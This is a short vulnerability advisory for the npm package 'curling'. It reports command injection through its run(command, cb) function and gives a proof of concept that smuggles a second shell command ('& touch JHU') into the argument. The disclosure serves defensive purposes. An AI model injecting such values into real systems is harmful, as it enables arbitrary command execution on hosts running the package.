[curling](https://www.npmjs.com/package/curling) is a node wrapper for curl with a very simple api.

Affected versions of this package are vulnerable to Command Injection via the  `run(command,cb)`  function. The  `command`  argument can be controlled by users without any sanitization.
## Proof of Concept (Credit: JHU System Security Lab)
```
var root = require("curling");
root.run("& touch JHU",function());
```
## References
-   [Vulnerable Code](https://github.com/hgarcia/curling/blob/e861d625c074679a2931bcf4ce8da0afa8162c53/lib/curl-transport.js#L56)